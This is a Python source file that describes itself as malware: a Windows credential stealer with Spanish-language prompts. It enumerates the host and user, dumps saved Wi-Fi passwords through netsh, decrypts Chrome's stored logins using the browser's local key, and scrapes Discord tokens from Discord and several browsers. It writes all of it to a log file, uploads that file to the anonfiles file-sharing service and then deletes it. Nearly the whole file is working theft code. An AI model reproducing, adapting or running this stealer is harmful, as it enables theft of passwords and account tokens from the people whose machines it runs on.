from email import message
import os
import re 
import getpass 
import smtplib
from urllib.request import Request, urlopen
import requests
import subprocess
import socket
from threading import Timer 
import keyboard  
import ssl 
import time 
import json 
import base64
import sqlite3
import win32crypt 
from Crypto.Cipher import AES
import shutil 
from datetime import timezone, datetime, timedelta
from colorama import Fore, init
init(convert=True)
#Malware coded by Maishet@.net ./revsocks -connect.exe 
os.system("echo. > logggg.fg")

SEND_REPORT_EVERY = 60

def banner(): 
       print(f'''{Fore.RED}

          
             ,. -,          ,.-·.                  ,. - .,                              _  °  
       ,.·'´,    ,'\        /    ;'\'           ,·'´ ,. - ,   ';\           ,.·,       :´¨   ;\   
   ,·'´ .·´'´-·'´::::\'     ;    ;:::\      ,·´  .'´\:::::;'   ;:'\ '      ,'   ,'\     .'´ ,·´::'\  
  ;    ';:::\::\::;:'     ';    ;::::;'    /  ,'´::::'\;:-/   ,' ::;  '    ;'  ,'::\ .·' .·´::::::;' 
  \·.    `·;:'-·'´         ;   ;::::;   ,'   ;':::::;'´ ';   /\::;' '      ;  ;::·´ .·´:::::::;·´  
   \:`·.   '`·,  '        ';  ;'::::;    ;   ;:::::;   '\*'´\::\'  °     ';  '´   ;´::::::;·´      
     `·:'`·,   \'         ;  ';:::';     ';   ';::::';    '\::'\/.'        ;  ;'\   '\::;·´          
      ,.'-:;'  ,·\        ';  ;::::;'     \    '·:;:'_ ,. -·'´.·´\‘     ;  ;:\:'·.  '·., ,.·';'     
 ,·'´     ,.·´:::'\        \*´\:::;‘      '\:` ·  .,.  -·:´::::::\'    ;_;::'\::`·._,.·'´:\'     
  \`*'´\::::::::;·'‘        '\::\:;'         \:::::::\:::::::;:·'´'     \::'\:;' '·::\::\:::::'\    
   \::::\:;:·´               `*´‘            `· :;::\;::-·´           '\::\     `·'\::\;:·'´'    
     '`*'´‘                                                              ¯          ¯'         

    {Fore.RESET}''')

def cls():
    os.system("cls" if os.name == "nt" else "clear")

def win_wifipsswds():
	command = "netsh wlan show profile"
	networks = subprocess.check_output(command, shell=True)
	network_names_list = re.findall("Profile\s*:\s.*", str(networks))
	network_names_list = str(network_names_list).split("    All User Profile")
	for x in range(len(network_names_list)):
		if x == 0:
			network_names_list[x] = str(network_names_list[x])[16:-6]
		elif x == len(network_names_list)-1:
			network_names_list[x] = str(network_names_list[x])[7:-15]
		else:
			network_names_list[x] = str(network_names_list[x])[7:-6]
	print(f"\n{Fore.RED}[ REDES ENCONTRADAS ]{Fore.RESET}\n")
	result = ""
	for network_name in network_names_list:
		command = f"netsh wlan show profile \"{network_name}\" key=clear"
		current_result = subprocess.check_output(command)
		auxiliar = str(re.findall("(Key\sContent?.*)(?=.........................................................................................)", str(current_result)))[27:-201]
		print(f"{Fore.RED}► {Fore.RESET}{network_name} : {auxiliar}")
		auxiliar = f"{network_name} : {auxiliar}"
		result += f"{auxiliar}\n"
	fss = open("logggg.fg", "a")
	fss.write(f"WIFI PSSWDS: \n{result}\n")
	fss.close()

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return print("Sistema no soportado!")

def win_appspwd():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    fss = open("logggg.fg", "a")
    fss.write(f"\nGOOGLE CHROME\n")
    fss.close()
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            print(f"URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Usuario: {username}")
            print(f"Contra: {password}")
            fss = open("logggg.fg", "a")
            fss.write(f"\n{origin_url}\n{username}:{password}\n")
            fss.close()
        else:
            continue
        if date_created != 86400000000 and date_created:
            print(f"Fecha de creacion: {str(get_chrome_datetime(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            print(f"Usada por ultima vez: {str(get_chrome_datetime(date_last_used))}")
        print("="*50)
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass

def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def win_dct():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    message = 'Tokens:'
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        message += f'\n**{platform}**\n```\n'
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No se encontraron tokens.\n'
        message += '```'
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    payload = json.dumps({'content': message})
    try:
        fss = open("logggg.fg", "a")
        fss.write(f"\n{message}\n")
        fss.close()
    except:
        pass

if os.name == "nt":
 cls()
 banner()
 print(f"\n{Fore.RED}Ennumerando sistema!{Fore.RESET}\n")
 print(f"{Fore.RED}Host:{Fore.RESET} {socket.gethostname()}")
 print(f"{Fore.RED}Username:{Fore.RESET} {getpass.getuser()}")
 print()
 fss = open("logggg.fg", "a")
 fss.write(f"\nHost: {socket.gethostname()}\nUsername: {getpass.getuser()}\n")
 fss.close()

 pregunta = input("Robo de contraseña de Wifi? (S/N) = ")
 if str(pregunta) == "S":
    print(f"{Fore.RED}Iniciando robo de credenciales WIFI{Fore.RESET}\n")
    win_wifipsswds()

 pregunta = input("Robo de contraseñas de Google Ch? (S/N) = ")
 if str(pregunta) == "S":
    print(f"\n{Fore.RED}Iniciando robo de credenciales de APPS {Fore.RESET}\n")
    win_appspwd()

 pregunta = input("Robo de Token de Discord? (S/N) = ")
 if str(pregunta) == "S":
    print(f"\n{Fore.RED}Iniciando robo de credenciales de DISCORD {Fore.RESET}\n")
    win_dct()

 print(f"\n{Fore.RED}Subiendo reporte... {Fore.RESET}\n")
 with open("logggg.fg", "rb") as ff:
    files = {
        "file": (ff)
    }
    response = requests.post("https://api.anonfiles.com/upload?token=tutokendeanonfiles", files=files)
 cls()
 print(response)
 print("Finalizado...")
 os.remove("logggg.fg")